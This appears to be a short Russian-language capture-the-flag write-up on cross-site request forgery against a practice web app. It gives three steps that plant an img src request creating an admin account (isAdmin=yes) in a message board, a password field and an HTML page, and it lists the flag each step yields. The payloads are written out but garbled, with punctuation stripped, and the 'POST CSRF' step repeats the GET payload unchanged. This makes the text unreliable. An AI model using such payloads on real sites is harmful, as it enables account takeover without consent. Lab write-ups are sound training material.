# **CSRF атака**

1. Зайти под тестовыми данными, введя логин - testuser1, пароль - testpass1, далее перейти к Add Admin user и добавить админа с данными testusertestpassword.

   На панели разработчика скопировать url запроса при создании админа `img src=http92.63.179.34add_adminusername=testuser&password=testpassword&isAdmin=yes&submit=Add+User`.

   В message board отправить картинку с url `img src=http92.63.179.34add_adminusername=testuser&password=testpassword&isAdmin=yes&submit=Add+User`, после чего пользователь создается.

   Flag NOW_YOU_KNOW_GET_CSRF

2. При создании нового пользователя можно ввести в поле для пароля `img src=http92.63.179.34add_adminusername=testuser&password=testpassword&isAdmin=yes&submit=Add+User`, после чего пользователь создается.

   Flag NOW_YOU_KNOW_GET_CSRF

3. Создать форму для отправки файлов, вставить html страницу с таким кодом `img src=http92.63.179.34add_adminusername=testuser&password=testpassword&isAdmin=yes&submit=Add+User`, после чего выполняется вход.

   Flag DID_YOU_LIKE_POST_CSRF
